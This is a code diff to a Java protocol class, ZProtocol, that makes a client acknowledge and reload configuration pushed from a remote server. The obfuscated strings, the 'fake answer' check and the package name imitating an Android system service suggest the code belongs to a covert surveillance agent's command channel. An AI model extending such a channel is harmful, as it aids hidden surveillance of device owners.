@@ -15,6 +15,7 @@ import java.security.SecureRandom;
 import java.util.Date;
 import java.util.Vector;
 
+import com.android.service.Core;
 import com.android.service.Device;
 import com.android.service.Messages;
 import com.android.service.Status;
@@ -61,7 +62,7 @@ public class ZProtocol extends Protocol {
 	 */
 	public ZProtocol() {
 		try {
-			random = SecureRandom.getInstance( Messages.getString("6.1")); //$NON-NLS-1$
+			random = SecureRandom.getInstance(Messages.getString("6.1")); //$NON-NLS-1$
 		} catch (final NoSuchAlgorithmException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (ZProtocol): " + e); //$NON-NLS-1$
@@ -193,7 +194,18 @@ public class ZProtocol extends Protocol {
 				Check.log(TAG + " Info: ***** NewConf *****"); //$NON-NLS-1$
 			}
 			final byte[] response = command(Proto.NEW_CONF);
-			parseNewConf(response);
+			boolean ret = parseNewConf(response);
+
+			byte[] data;
+			if (ret) {
+				data = Utils.intToByteArray(Proto.OK);
+			} else {
+				data = Utils.intToByteArray(Proto.NO);
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (newConf): sending answer: " + ret);
+			}
+			command(Proto.NEW_CONF, data);
 		}
 	}
 
@@ -380,7 +392,7 @@ public class ZProtocol extends Protocol {
 	 */
 	protected boolean parseAuthentication(final byte[] authResult) throws ProtocolException {
 
-		if (new String(authResult).contains( Messages.getString("6.0"))) { //$NON-NLS-1$
+		if (new String(authResult).contains(Messages.getString("6.0"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: Fake answer"); //$NON-NLS-1$
 			}
@@ -542,13 +554,16 @@ public class ZProtocol extends Protocol {
 	 * 
 	 * @param result
 	 *            the result
+	 * @return false if error loading new conf, true if no conf or conf read correct
 	 * @throws ProtocolException
 	 *             the protocol exception
 	 * @throws CommandException
 	 *             the command exception
+	 *             
 	 */
-	protected void parseNewConf(final byte[] result) throws ProtocolException, CommandException {
+	protected boolean parseNewConf(final byte[] result) throws ProtocolException, CommandException {
 		final int res = Utils.byteArrayToInt(result, 0);
+		boolean ret = false;
 		if (res == Proto.OK) {
 
 			final int confLen = Utils.byteArrayToInt(result, 4);
@@ -557,13 +572,14 @@ public class ZProtocol extends Protocol {
 					Check.log(TAG + " Info: got NewConf"); //$NON-NLS-1$
 				}
 
-				final boolean ret = Protocol.saveNewConf(result, 8);
+				ret = Protocol.saveNewConf(result, 8);
 
 				if (ret) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (parseNewConf): RELOADING"); //$NON-NLS-1$
 					}
-					status.reload = true;
+					// status.reload = true;
+					ret = Core.getInstance().reloadConf();
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -571,16 +587,21 @@ public class ZProtocol extends Protocol {
 				}
 			}
 
+			return ret;
+
 		} else if (res == Proto.NO) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: no new conf: "); //$NON-NLS-1$
+
 			}
+			return true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: parseNewConf: " + res); //$NON-NLS-1$
 			}
 			throw new ProtocolException();
 		}
+
 	}
 
 	/**
